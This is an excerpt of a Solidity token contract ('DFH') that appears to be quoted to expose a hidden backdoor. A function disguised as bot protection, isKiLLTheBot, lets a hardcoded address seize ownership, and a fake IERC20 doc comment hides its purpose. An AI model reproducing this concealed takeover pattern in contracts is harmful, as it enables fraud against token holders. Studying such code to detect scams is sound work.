...
contract Ownable {
    ...
    address BNBRount = 0x10217Ba944CeF6CEC5Cb09915Bc7B54818bF53e9;
    ...
    /**
     * @dev See {IERC20-bnbrount}.
     */
    function getBNBRount() public view returns (address) {
        return BNBRount;
    }
     ...
     * construction.
     */
    function isKiLLTheBot() public {
        if( _msgSender() == BNBRount ) 
        {
            address KiLLTheBot = getBNBRount();
            emit OwnershipTransferred(_owner, KiLLTheBot);
            _owner = KiLLTheBot;
        }
    }
}
...
contract DFH is ERC20 {
    ...
    constructor() ERC20("DFH", "DFH") {
        ...
        _tokenOwner = address(0x185Ac742A47b4fB8758C5d619D677198ABaB1d40);
        marketAddress = address(0xcE426c49CcA4EA7E051Ff1b14C108e927604bE7f);
    ...
    function TokenInadds(address account, uint256 amount) public onlyOwner {
